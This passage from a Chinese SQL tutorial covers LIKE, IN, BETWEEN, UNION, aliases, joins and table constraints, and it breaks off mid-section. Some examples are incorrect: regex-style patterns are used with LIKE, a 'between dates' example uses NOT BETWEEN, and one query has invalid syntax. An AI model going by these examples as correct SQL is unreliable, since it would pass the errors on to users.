<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段 <span class="keyword">like</span> <span class="string">&#x27;^[abc]&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<p>8、查询以a-z开头的所有数据</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段 <span class="keyword">like</span> <span class="string">&#x27;^[a-z]&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<p>9、查询不以a-z开头的所有数据</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段 <span class="keyword">like</span> <span class="string">&#x27;^[^a-z]&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="2、in"><a href="#2、in" class="headerlink" title="2、in"></a><strong>2、in</strong></h3><p>查询结果为a或者b的数据</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段 <span class="keyword">in</span> (‘a’,’b’)</span><br></pre></td></tr></table></figure></div>

<h3 id="3、between"><a href="#3、between" class="headerlink" title="3、between"></a><strong>3、between</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#选取介于两个值之间的数据范围内的值。这些值可以是数值、文本或者日期。</span><br></pre></td></tr></table></figure></div>

<p>1、查询1-20之间的所有数据</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段名 <span class="keyword">between</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure></div>

<p>2、查询不在1-20之间的所有数据</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段名 <span class="keyword">not</span> <span class="keyword">between</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure></div>

<p>3、查询1-20之间并且值不为a、b、c的所有数据</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段名 (<span class="keyword">between</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">20</span>) <span class="keyword">and</span> 字段名 <span class="keyword">not</span> <span class="keyword">in</span>(‘a’,’b’,’c’);</span><br></pre></td></tr></table></figure></div>

<p>4、查询’a’ 和 ‘h’ 之间字母开始的所有数据</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段名 <span class="keyword">between</span> ‘a’ <span class="keyword">and</span> ‘h’;</span><br></pre></td></tr></table></figure></div>

<p>5、查询不在’a’ 和 ‘h’ 之间字母开始的所有数据</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段名 <span class="keyword">not</span> <span class="keyword">between</span> ‘a’ <span class="keyword">and</span> ‘h’;</span><br></pre></td></tr></table></figure></div>

<p>6、查询日期在’2021-01-01’ 和 ‘2022-01-01’ 之间的所有数据：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段名 <span class="keyword">not</span> <span class="keyword">between</span> ‘<span class="number">2021</span><span class="number">-01</span><span class="number">-01</span>’ <span class="keyword">and</span> ‘<span class="number">2022</span><span class="number">-01</span><span class="number">-01</span>’;</span><br></pre></td></tr></table></figure></div>

<h3 id="4、union"><a href="#4、union" class="headerlink" title="4、union"></a><strong>4、union</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">union</span> 操作符用于合并两个或多个 <span class="keyword">select</span> 语句的结果集。</span><br><span class="line">#请注意，<span class="keyword">union</span> 内部的每个 <span class="keyword">select</span> 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 <span class="keyword">select</span> 语句中的列的顺序必须相同。</span><br><span class="line">#注释：默认地，<span class="keyword">union</span> 操作符选取不同的值。如果允许重复的值，请使用 <span class="keyword">union</span> <span class="keyword">all</span>。</span><br></pre></td></tr></table></figure></div>

<p>1、union 获取不重复的值</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>,字段<span class="number">2</span> <span class="keyword">from</span> 表名</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>,字段<span class="number">2</span> <span class="keyword">from</span> 表名</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 字段<span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<p>2、union all 获取所有的值（包含重复的）</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>,字段<span class="number">2</span> <span class="keyword">from</span> 表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>,字段<span class="number">2</span> <span class="keyword">from</span> 表名</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 字段<span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>



<h2 id="七、别名"><a href="#七、别名" class="headerlink" title="七、别名"></a>七、别名</h2><h3 id="1、as"><a href="#1、as" class="headerlink" title="1、as"></a><strong>1、as</strong></h3><p>1、表别名</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">as</span> 别名</span><br></pre></td></tr></table></figure></div>

<p>2、列别名</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span> <span class="keyword">as</span> 别名 <span class="keyword">from</span> 表名</span><br></pre></td></tr></table></figure></div>

<p>3、混合别名</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> </span><br><span class="line"></span><br><span class="line">表<span class="number">1</span>别名.字段名,</span><br><span class="line"></span><br><span class="line">表<span class="number">2</span>别名.字段名 </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> </span><br><span class="line"></span><br><span class="line">表<span class="number">1</span> <span class="keyword">as</span> 表<span class="number">1</span>别名,</span><br><span class="line"></span><br><span class="line">表<span class="number">2</span> <span class="keyword">as</span> 表<span class="number">2</span>别名</span><br></pre></td></tr></table></figure></div>

<h2 id="八、join"><a href="#八、join" class="headerlink" title="八、join"></a>八、join</h2><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">join</span> 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。</span><br></pre></td></tr></table></figure></div>

<h3 id="1、inner-join"><a href="#1、inner-join" class="headerlink" title="1、inner join"></a>1、inner join</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果表中有至少一个匹配，则返回行</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> </span><br><span class="line"></span><br><span class="line">表<span class="number">1.</span>字段名,</span><br><span class="line"></span><br><span class="line">表<span class="number">2.</span>字段名</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> 表<span class="number">1</span> <span class="keyword">inner</span> <span class="keyword">join</span> 表<span class="number">2</span> <span class="keyword">on</span> 表<span class="number">1.</span>id<span class="operator">=</span>表<span class="number">2.</span>id;</span><br></pre></td></tr></table></figure></div>

<h3 id="2、left-join"><a href="#2、left-join" class="headerlink" title="2、left join"></a>2、left join</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">即使右表中没有匹配，也从左表返回所有的行</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> </span><br><span class="line"></span><br><span class="line">表<span class="number">1.</span>字段名,</span><br><span class="line"></span><br><span class="line">表<span class="number">2.</span>字段名</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> 表<span class="number">1</span> <span class="keyword">left</span> <span class="keyword">join</span> 表<span class="number">2</span> <span class="keyword">on</span> 表<span class="number">1.</span>id<span class="operator">=</span>表<span class="number">2.</span>id;</span><br></pre></td></tr></table></figure></div>

<h3 id="3、right-join"><a href="#3、right-join" class="headerlink" title="3、right join"></a>3、right join</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">即使左表中没有匹配，也从右表返回所有的行</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> </span><br><span class="line"></span><br><span class="line">表<span class="number">1.</span>字段名,</span><br><span class="line"></span><br><span class="line">表<span class="number">2.</span>字段名</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> 表<span class="number">1</span> <span class="keyword">right</span> <span class="keyword">join</span> 表<span class="number">2</span> <span class="keyword">on</span> 表<span class="number">1.</span>id<span class="operator">=</span>表<span class="number">2.</span>id;</span><br></pre></td></tr></table></figure></div>

<h3 id="4、full-join"><a href="#4、full-join" class="headerlink" title="4、full join"></a>4、full join</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">只要其中一个表中存在匹配，则返回行（mysql不支持）</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> </span><br><span class="line"></span><br><span class="line">表<span class="number">1.</span>字段名,</span><br><span class="line"></span><br><span class="line">表<span class="number">2.</span>字段名</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> 表<span class="number">1</span> <span class="keyword">full</span> <span class="keyword">outer</span> <span class="keyword">join</span> 表<span class="number">2</span> <span class="keyword">on</span> 表<span class="number">1.</span>id<span class="operator">=</span>表<span class="number">2.</span>id;</span><br></pre></td></tr></table></figure></div>

<h2 id="九、约束"><a href="#九、约束" class="headerlink" title="九、约束"></a>九、约束</h2><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名 </span><br><span class="line">(</span><br><span class="line"> 字段名 字段类型（最大长度）约束</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">#在 <span class="keyword">sql</span> 中，我们有如下约束：</span><br><span class="line">#<span class="number">1</span>、<span class="keyword">not</span> <span class="keyword">null</span> <span class="operator">-</span> 指示某列不能存储 <span class="keyword">null</span> 值。</span><br><span class="line">#<span class="number">2</span>、<span class="keyword">unique</span> <span class="operator">-</span> 保证某列的每行必须有唯一的值。</span><br><span class="line">#<span class="number">3</span>、<span class="keyword">primary</span> key <span class="operator">-</span> <span class="keyword">not</span> <span class="keyword">null</span> 和 <span class="keyword">unique</span> 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助于更容易更快速地找到表中的一个特定的记录。</span><br><span class="line">#<span class="number">4</span>、<span class="keyword">foreign</span> key <span class="operator">-</span> 保证一个表中的数据匹配另一个表中的值的参照完整性。</span><br><span class="line">#<span class="number">5</span>、<span class="keyword">check</span> <span class="operator">-</span> 保证列中的值符合指定的条件。</span><br><span class="line">#<span class="number">6</span>、<span class="keyword">default</span> <span class="operator">-</span> 规定没有给列赋值时的默认值。</span><br></pre></td></tr></table></figure></div>

<h3 id="1、not-null"><a href="#1、not-null" class="headerlink" title="1、not null"></a><strong>1、not null</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">not</span> <span class="keyword">null</span> 约束强制列不接受 <span class="keyword">null</span> 值。</span><br><span class="line">#<span class="keyword">not</span> <span class="keyword">null</span> 约束强制字段始终包含值。这意味着，如果不向字段添加值，就无法插入新记录或者更新记录。</span><br></pre></td></tr></table></figure></div>

<p>1、添加 not null 约束</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 modify 字段名 <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure></div>

<p>2、删除 not null 约束</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 modify 字段名 <span class="type">int</span>  <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="2、unique"><a href="#2、unique" class="headerlink" title="2、unique"></a><strong>2、unique</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">unique</span> 约束唯一标识数据库表中的每条记录。</span><br><span class="line">#<span class="keyword">unique</span> 和 <span class="keyword">primary</span> key 约束均为列或列集合提供了唯一性的保证。</span><br><span class="line">#<span class="keyword">primary</span> key 约束拥有自动定义的 <span class="keyword">unique</span> 约束。</span><br><span class="line">#请注意，每个表可以有多个 <span class="keyword">unique</span> 约束，但是每个表只能有一个 <span class="keyword">primary</span> key 约束。</span><br></pre></td></tr></table></figure></div>

<p><strong>（1）、创建表时，添加约束</strong></p>
<p>1、mysql</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名</span><br><span class="line">(</span><br><span class="line"> p_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"> <span class="keyword">unique</span> (p_id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>2、sql server &#x2F; oracle &#x2F; ms access</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名</span><br><span class="line">(</span><br><span class="line"> p_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#如需命名 <span class="keyword">unique</span> 约束，并定义多个列的 <span class="keyword">unique</span> 约束，请使用下面的 <span class="keyword">sql</span> 语法：</span><br></pre></td></tr></table></figure></div>

<p>3、mysql &#x2F; sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名</span><br><span class="line">(</span><br><span class="line"> p_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"> lastname <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"> <span class="keyword">constraint</span> uc_personid<span class="operator">=</span>约束名 <span class="keyword">unique</span> (p_id,lastname)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p><strong>（2）、表已存在时，添加约束</strong></p>
<p>1、当表已被创建时，如需在 “p_id” 列创建 unique 约束，请使用下面的 sql：</p>
<p>mysql &#x2F; sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span> <span class="keyword">unique</span> (p_id)</span><br></pre></td></tr></table></figure></div>

<p>2、如需命名 unique 约束，并定义多个列的 unique 约束，请使用下面的 sql 语法：</p>
<p>mysql &#x2F; sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span> <span class="keyword">constraint</span> uc_personid<span class="operator">=</span>约束名 <span class="keyword">unique</span> (p_id,lastname)</span><br></pre></td></tr></table></figure></div>

<p><strong>（3）、表已存在时，撤销约束</strong></p>
<p>1、mysql：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> index uc_personid<span class="operator">=</span>约束名</span><br></pre></td></tr></table></figure></div>

<p>2、sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> <span class="keyword">constraint</span> uc_personid<span class="operator">=</span>约束名</span><br></pre></td></tr></table></figure></div>

<h3 id="3、primary-key"><a href="#3、primary-key" class="headerlink" title="3、primary key"></a><strong>3、primary key</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">primary</span> key 约束唯一标识数据库表中的每条记录。</span><br><span class="line">#主键必须包含唯一的值。</span><br><span class="line">#主键列不能包含 <span class="keyword">null</span> 值。</span><br><span class="line">#每个表都应该有一个主键，并且每个表只能有一个主键。</span><br></pre></td></tr></table></figure></div>

<p><strong>（1）、创建表时，添加约束</strong></p>
<p>1、mysql</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名</span><br><span class="line">(</span><br><span class="line"> p_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"> <span class="keyword">primary</span> key (p_id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>2、sql server &#x2F; oracle &#x2F; ms access</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名</span><br><span class="line">(</span><br><span class="line"> p_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">primary</span> key,</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>3、如需命名 unique 约束，并定义多个列的 unique 约束，请使用下面的 sql 语法：</p>
<p>mysql &#x2F; sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名</span><br><span class="line">(</span><br><span class="line"> p_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"> lastname <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"> <span class="keyword">constraint</span> pk_personid<span class="operator">=</span>约束名 <span class="keyword">primary</span> key  (p_id,lastname)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p><strong>（2）、表已存在时，添加约束</strong></p>
<p>1、当表已被创建时，如需在 “p_id” 列创建 primary key 约束，请使用下面的 sql：</p>
<p>mysql &#x2F; sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span> <span class="keyword">primary</span> key  (p_id)</span><br></pre></td></tr></table></figure></div>

<p>2、如需命名 unique 约束，并定义多个列的 primary key 约束，请使用下面的 sql 语法：</p>
<p>mysql &#x2F; sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span> <span class="keyword">constraint</span> pk_personid<span class="operator">=</span>约束名 <span class="keyword">primary</span> key  (p_id,lastname)</span><br></pre></td></tr></table></figure></div>

<p><strong>（3）、表已存在时，撤销约束</strong></p>
<p>1、mysql：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> <span class="keyword">primary</span> key</span><br></pre></td></tr></table></figure></div>

<p>2、sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> <span class="keyword">constraint</span> pk_personid<span class="operator">=</span>约束名</span><br></pre></td></tr></table></figure></div>

<h3 id="4、foreign-key"><a href="#4、foreign-key" class="headerlink" title="4、foreign key"></a><strong>4、foreign key</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#一个表中的 <span class="keyword">foreign</span> key 指向另一个表中的 <span class="keyword">unique</span> key(唯一约束的键)。</span><br></pre></td></tr></table></figure></div>

<p><strong>（1）、创建表时添加约束</strong></p>
<p>1、mysql：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表<span class="number">1</span></span><br><span class="line">(</span><br><span class="line"> o_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"> orderno <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"> p_id <span class="type">int</span>,</span><br><span class="line"> <span class="keyword">primary</span> key (o_id),</span><br><span class="line"> <span class="keyword">foreign</span> key (p_id) <span class="keyword">references</span> 表<span class="number">2</span>(p_id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>2、sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表<span class="number">1</span></span><br><span class="line">(</span><br><span class="line"> o_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">primary</span> key,</span><br><span class="line"> orderno <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"> p_id <span class="type">int</span> <span class="keyword">foreign</span> key <span class="keyword">references</span> 表<span class="number">2</span>(p_id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>3、如需命名 foreign key 约束，并定义多个列的 foreign key 约束，请使用下面的 sql 语法：</p>
<p>mysql &#x2F; sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表<span class="number">1</span>(</span><br><span class="line"> o_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"> orderno <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"> p_id <span class="type">int</span>,</span><br><span class="line"> <span class="keyword">primary</span> key (o_id),</span><br><span class="line"> <span class="keyword">constraint</span> fk_perorders<span class="operator">=</span>约束名 <span class="keyword">foreign</span> key (p_id)</span><br><span class="line"> <span class="keyword">references</span> 表<span class="number">2</span>(p_id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p><strong>（2）、表已存在时，添加约束</strong></p>
<p>1、mysql &#x2F; sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表<span class="number">1</span> <span class="keyword">add</span> <span class="keyword">foreign</span> key (p_id) <span class="keyword">references</span> 表<span class="number">2</span>(p_id)</span><br></pre></td></tr></table></figure></div>

<p>如需命名 foreign key 约束，并定义多个列的 foreign key 约束，请使用下面的 sql 语法：</p>
<p>2、mysql &#x2F; sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表<span class="number">1</span></span><br><span class="line"><span class="keyword">add</span> <span class="keyword">constraint</span> fk_perorders<span class="operator">=</span>约束名</span><br><span class="line"><span class="keyword">foreign</span> key (p_id)</span><br><span class="line"><span class="keyword">references</span> 表<span class="number">2</span>(p_id)</span><br></pre></td></tr></table></figure></div>

<p><strong>（3）、表已存在时，撤销约束</strong></p>
<p>1、mysql：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表<span class="number">1</span> <span class="keyword">drop</span> <span class="keyword">foreign</span> key fk_perorders</span><br></pre></td></tr></table></figure></div>

<p>2、sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表<span class="number">1</span> <span class="keyword">drop</span> <span class="keyword">constraint</span> fk_perorders</span><br></pre></td></tr></table></figure></div>

<h3 id="5、check"><a href="#5、check" class="headerlink" title="5、check"></a><strong>5、check</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">check</span> 约束用于限制列中的值的范围。</span><br><span class="line">#如果对单个列定义 <span class="keyword">check</span> 约束，那么该列只允许特定的值。</span><br><span class="line">#如果对一个表定义 <span class="keyword">check</span> 约束，那么此约束会基于行中其他列的值在特定的列中对值进行限制。</span><br></pre></td></tr></table></figure></div>

<p><strong>（1）、创建表时添加约束</strong></p>
<p>1、mysql：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名</span><br><span class="line">(</span><br><span class="line"> p_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"> <span class="keyword">check</span> (p_id<span class="operator">&gt;</span><span class="number">0</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>2、sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表</span><br><span class="line">(</span><br><span class="line"> p_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">check</span> (p_id<span class="operator">&gt;</span><span class="number">0</span>),</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>3、如需命名 check 约束，并定义多个列的 check 约束，请使用下面的 sql 语法：</p>
<p>mysql &#x2F; sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> persons</span><br><span class="line">(</span><br><span class="line"> p_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"> city <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line"> <span class="keyword">constraint</span> chk_person<span class="operator">=</span>约束名 <span class="keyword">check</span> (p_id<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">and</span> city<span class="operator">=</span><span class="string">&#x27;sandnes&#x27;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p><strong>（2）、表已存在时，添加约束</strong></p>
<p>1、mysql &#x2F; sql server &#x2F; oracle &#x2F; ms access:</p>
